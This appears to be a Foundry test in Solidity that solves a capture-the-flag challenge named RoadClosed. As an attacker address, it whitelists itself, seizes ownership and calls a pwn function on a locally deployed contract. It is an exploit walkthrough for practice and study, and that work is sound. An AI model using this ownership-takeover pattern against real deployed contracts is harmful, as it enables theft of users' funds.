// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RoadClosed.sol";

contract Attack is Test {
    RoadClosed target;

    address attacker = makeAddr("attacker");

    function setUp() public {
        target = new RoadClosed();
        startHoax(attacker); 
    }

    function testAttack() external {
        // Step 0: Check that we are not hacked
        assertTrue(!target.isHacked());

        // Step 1: Get ourselves on the whitelist
        target.addToWhitelist(attacker);

        // Step 2: Take over ownership 
        target.changeOwner(attacker);

        // Step 3: Call pwn function to set Hacked == true 
        target.pwn(attacker);

        // check that we changed the hacked variable to true 
        assertTrue(target.isHacked());
    }


}
